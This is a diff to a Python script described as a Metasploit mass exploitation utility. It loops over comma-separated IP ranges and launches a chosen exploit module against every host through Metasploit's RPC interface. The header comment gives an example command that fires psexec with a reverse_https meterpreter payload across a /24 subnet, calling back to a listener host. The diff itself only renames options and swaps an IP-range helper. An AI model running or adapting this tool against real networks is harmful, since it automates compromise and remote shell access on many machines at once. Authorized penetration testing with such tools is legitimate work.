@@ -4,15 +4,12 @@
 # Metasploit mass exploitation utility
 #
 # Example:
-# $ ./multisploit.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
-#   -t 192.168.1.0/24 --handler-opts='LHOST=192.168.1.16,LPORT=443'
+# $ ./msfmulti.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
+#   -t 192.168.1.0/24 --opts='LHOST=192.168.1.16,LPORT=443'
 #
-
 from argparse import ArgumentParser
 
-from netaddr import iter_nmap_range
-
-from lib.helpers import add_rpc_parser
+from lib.helpers import add_rpc_parser, explode_ip_ranges
 from lib.msfrpc import rpc_connect
 
 
@@ -59,7 +56,7 @@ def main():
         'DisablePayloadHandler': True
     })
     for target_range in args.targets.split(','):
-        for target in iter_nmap_range(target_range):
+        for target in explode_ip_ranges(target_range):
             opts['RHOST'] = str(target)
             rpc.call('module.execute', ['exploit', args.exploit, opts])
             print("[-] Launched exploit against {}".format(target))
